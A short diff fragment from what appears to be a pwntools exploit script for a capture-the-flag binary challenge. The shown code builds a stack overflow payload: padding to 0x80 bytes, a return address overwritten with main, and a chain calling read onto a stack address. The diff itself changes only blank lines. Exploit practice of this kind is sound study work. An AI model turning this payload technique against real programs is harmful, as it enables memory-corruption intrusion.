@@ -38,6 +38,7 @@ p += flat(
     0x0
 
 )
+
 p += 'a' * ( 0x80 - len(p) - 8 )
 p += p64( main )
 print hex( len( p ) )
@@ -71,7 +72,6 @@ p += flat(
     read,
     stk
 )
-
 
 y.sendafter( '?' , p )
 
